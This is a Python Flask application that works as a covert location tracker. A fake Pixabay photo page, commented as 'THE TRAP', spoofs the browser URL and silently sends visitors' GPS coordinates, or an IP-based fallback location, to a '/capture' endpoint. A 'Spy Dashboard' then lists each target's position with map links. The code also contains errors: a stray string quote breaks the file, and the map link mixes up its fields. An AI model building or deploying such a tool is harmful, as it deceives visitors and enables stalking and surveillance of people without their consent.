from flask import Flask, request, render_template_string
import sqlite3
from datetime import datetime
import urllib.request
import json
import os

app = Flask(__name__)

# --- DATABASE SETUP ---
def init_db():
    conn = sqlite3.connect("tracker.db")
    c = conn.cursor()
    c.execute("""CREATE TABLE IF NOT EXISTS logs (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        lat TEXT, lon TEXT, city TEXT, country TEXT, ip TEXT, time TEXT, method TEXT
    )""")
    conn.commit()
    conn.close()

def log_location(lat, lon, city, country, ip, method):
    conn = sqlite3.connect("tracker.db")
    c = conn.cursor()
    time_now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    c.execute("INSERT INTO logs (lat, lon, city, country, ip, time, method) VALUES (?, ?, ?, ?, ?, ?, ?)", 
              (lat, lon, city, country, ip, time_now, method))
    conn.commit()
    conn.close()

def get_logs():
    conn = sqlite3.connect("tracker.db")
    c = conn.cursor()
    c.execute("SELECT * FROM logs ORDER BY id DESC")
    rows = c.fetchall()
    conn.close()
    return rows

# --- THE TRAP (Cloaked as Pixabay) ---
TRAP_HTML = """
<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Bread Machine - Free photo on Pixabay</title>
    <script>
        // 1. Steal the URL to make it look like Pixabay
        window.history.pushState("", "", "/photos/bread-machine-household-appliances-6047/");
        
        // 2. Silent Tracker
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                function(position) {
                    fetch('/capture?lat=' + position.coords.latitude + '&lon=' + position.coords.longitude + '&method=GPS');
                },
                function(error) {
                    fetch('/capture?method=IP');
                }
            );
        } else {
            fetch('/capture?method=IP');
        }
    </script>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; margin: 0; background: #fff; color: #333; }
        .header { display: flex; align-items: center; padding: 15px 20px; border-bottom: 1px solid #eee; }
        .header img { height: 30px; }
        .header h2 { margin: 0 0 0 10px; font-size: 20px; color: #191b26; font-weight: bold; }
        .main { max-width: 900px; margin: 20px auto; padding: 0 20px; display: flex; gap: 30px; }
        .image-container { flex: 2; }
        .image-container img { width: 100%; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
        .sidebar { flex: 1; }
        h1 { font-size: 24px; margin-top: 0; color: #191b26; }
        .tags { display: flex; gap: 10px; margin-top: 15px; flex-wrap: wrap; }
        .tag { background: #f2f2f2; color: #555; padding: 6px 12px; border-radius: 20px; font-size: 13px; text-decoration: none; }
        .author-box { display: flex; align-items: center; margin-top: 30px; padding-top: 20px; border-top: 1px solid #eee; }
        .author-icon { width: 40px; height: 40px; border-radius: 50%; background: #ccc; margin-right: 15px; }
        .btn-download { display: block; text-align: center; background: #05a081; color: white; padding: 12px; border-radius: 24px; font-weight: bold; text-decoration: none; margin-top: 20px; }
    </style>
</head>
<body>
    <div class="header">
        <!-- Pixabay Logo -->
        <svg height="30" viewBox="0 0 100 30" fill="#05a081"><text x="0" y="24" font-family="Arial" font-weight="bold" font-size="24">pixabay</text></svg>
    </div>
    <div class="main">
        <div class="image-container">
            <!-- The Bread Machine Image -->
            <img src="https://cdn.pixabay.com/photo/2012/04/15/20/39/bread-35042_1280.png" alt="Bread Machine, Household Appliances">
        </div>
        <div class="sidebar">
            <h1>Bread Machine, Household Appliances</h1>
            <p style="color: #767676; font-size: 14px;">Free photo by <strong>OpenClipart-Vectors</strong></p>
            
            <div class="tags">
                <a href="#" class="tag">bread machine</a>
                <a href="#" class="tag">household appliances</a>
                <a href="#" class="tag">kitchen</a>
                <a href="#" class="tag">bread</a>
            </div>

            <a href="#" class="btn-download">Download</a>

            <div class="author-box">
                <div class="author-icon"></div>
                <div>
                    <strong>OpenClipart-Vectors</strong><br>
                    <span style="font-size: 12px; color: #767676;">2,419 Followers</span>
                </div>
            </div>
        </div>
    </div>
</body>
</html>
"""
"""

# --- YOUR DASHBOARD ---
DASHBOARD_HTML = """
<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Spy Dashboard</title>
    <style>
        body { background-color: #0a1628; color: #f5f5f0; font-family: sans-serif; padding: 20px; }
        h1 { color: #d4a017; }
        table { width: 100%; border-collapse: collapse; margin-top: 20px; }
        th, td { border: 1px solid #1e5a8a; padding: 12px; text-align: left; }
        th { background-color: #1e5a8a; color: white; }
        a { color: #d4a017; text-decoration: none; font-weight: bold; }
        .gps { color: #4ade80; font-weight: bold; }
        .ip { color: #fbbf24; font-weight: bold; }
    </style>
</head>
<body>
    <h1>Target Tracker Dashboard</h1>
    <table>
        <tr>
            <th>Time</th>
            <th>Method</th>
            <th>IP Address</th>
            <th>Approx City</th>
            <th>Map Link</th>
        </tr>
        {% for log in logs %}
        <tr>
            <td>{{ log[5] }}</td>
            <td class="{{ 'gps' if log[6] == 'GPS' else 'ip' }}">{{ log[6] }}</td>
            <td>{{ log[4] }}</td>
            <td>{{ log[2] }}, {{ log[3] }}</td>
            <td><a href="https://www.google.com/maps?q={{ log[1] }},{{ log[2] }}" target="_blank">Open Map 📍</a></td>
        </tr>
        {% endfor %}
    </table>
</body>
</html>
"""

@app.route('/')
def dashboard():
    return render_template_string(DASHBOARD_HTML, logs=get_logs())

@app.route('/trap')
def trap():
    return render_template_string(TRAP_HTML)

@app.route('/capture')
def capture():
    lat = request.args.get('lat')
    lon = request.args.get('lon')
    method = request.args.get('method')
    
    if request.headers.getlist("X-Forwarded-For"):
       ip = request.headers.getlist("X-Forwarded-For")[0]
    else:
       ip = request.remote_addr

    city, country = "Unknown", "Unknown"
       
    if method == "IP" or not lat:
        try:
            req = urllib.request.urlopen(f'http://ip-api.com/json/{ip}').read()
            data = json.loads(req)
            if data['status'] == 'success':
                lat = data['lat']
                lon = data['lon']
                city = data['city']
                country = data['country']
        except Exception:
            pass

    if lat and lon:
        log_location(lat, lon, city, country, ip, method)
        return "Logged", 200
    return "Failed", 400

if __name__ == '__main__':
    init_db()
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
